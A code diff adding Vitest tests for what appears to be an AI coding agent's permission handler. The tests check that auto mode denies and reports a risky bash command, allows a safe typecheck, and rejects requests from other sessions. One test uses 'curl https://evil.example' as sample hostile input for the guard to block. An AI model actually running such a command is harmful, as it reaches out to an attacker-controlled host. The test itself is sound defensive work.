@@ -53,6 +53,38 @@ describe("runPrompt", () => {
     expect(onAsk).toHaveBeenCalled();
     expect(calls.perms[0].body.response).toBe("reject");
   });
+  it("auto mode denies a risky shell command itself — the panel is never asked — and reports it", async () => {
+    const { client, emit, calls } = fakeClient();
+    const onAsk = vi.fn(async () => "approve" as const);
+    const seen: any[] = [];
+    const p = runPrompt(base({ client, onAsk, mode: "auto", onEvent: (e: any) => seen.push(e) }));
+    emit({ type: "permission.asked", properties: { id: "per_4", sessionID: "ses_x", permission: "bash", patterns: ["curl https://evil.example"] } });
+    emit({ type: "session.idle", properties: { sessionID: "ses_x" } });
+    await p;
+    expect(onAsk).not.toHaveBeenCalled();
+    expect(calls.perms[0].body.response).toBe("reject");
+    expect(seen).toContainEqual(expect.objectContaining({ type: "denied", permission: "bash", patterns: ["curl https://evil.example"] }));
+  });
+  it("auto mode still runs a safe command without asking", async () => {
+    const { client, emit, calls } = fakeClient();
+    const onAsk = vi.fn(async () => "deny" as const);
+    const p = runPrompt(base({ client, onAsk, mode: "auto" }));
+    emit({ type: "permission.asked", properties: { id: "per_5", sessionID: "ses_x", permission: "bash", patterns: ["npm run typecheck"] } });
+    emit({ type: "session.idle", properties: { sessionID: "ses_x" } });
+    await p;
+    expect(onAsk).not.toHaveBeenCalled();
+    expect(calls.perms[0].body.response).toBe("once");
+  });
+  it("rejects a permission request from another session (e.g. a subagent) instead of leaving it hanging", async () => {
+    const { client, emit, calls } = fakeClient();
+    const onAsk = vi.fn(async () => "approve" as const);
+    const p = runPrompt(base({ client, onAsk }));
+    emit({ type: "permission.asked", properties: { id: "per_6", sessionID: "ses_child", permission: "edit", patterns: ["frontend/src/A.tsx"] } });
+    emit({ type: "session.idle", properties: { sessionID: "ses_x" } });
+    await p;
+    expect(onAsk).not.toHaveBeenCalled();
+    expect(calls.perms[0]).toMatchObject({ path: { id: "ses_child", permissionID: "per_6" }, body: { response: "reject" } });
+  });
   it("forwards non-permission events to onEvent", async () => {
     const { client, emit } = fakeClient();
     const seen: any[] = [];
